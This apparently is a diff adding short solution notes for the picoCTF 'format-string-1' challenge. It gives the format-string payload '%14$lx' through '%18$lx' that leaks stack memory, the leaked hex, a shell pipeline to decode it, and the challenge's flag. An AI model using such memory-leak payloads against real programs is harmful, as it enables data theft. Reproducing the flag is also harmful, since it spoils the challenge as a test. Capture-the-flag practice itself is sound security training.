@@ -1,0 +1,16 @@
+curl -sO https://artifacts.picoctf.net/c_mimas/44/format-string-1.c
+curl -sO https://artifacts.picoctf.net/c_mimas/44/format-string-1
+
+gcc -g -o format1 format-string-1.c
+gdb -q ./format1
+
+experiment with different format specifiers and see which one will print the content at the address of flag.
+
+In the end correct specifiers are: %14$lx,%15$lx,%16$lx,%17$lx,%18$lx
+
+it will print the byte value as below
+7b4654436f636970,355f31346d316e34,3478345f33317937,31655f673431665f,7d383130386531
+
+$ echo '7b4654436f636970,355f31346d316e34,3478345f33317937,31655f673431665f,7d383130386531' | tr ',' '\n' | xxd -r -p | fold -w8 | rev | tr -d '\n'
+picoCTF{4n1m41_57y13_4x4_f14g_e11e8018}
+
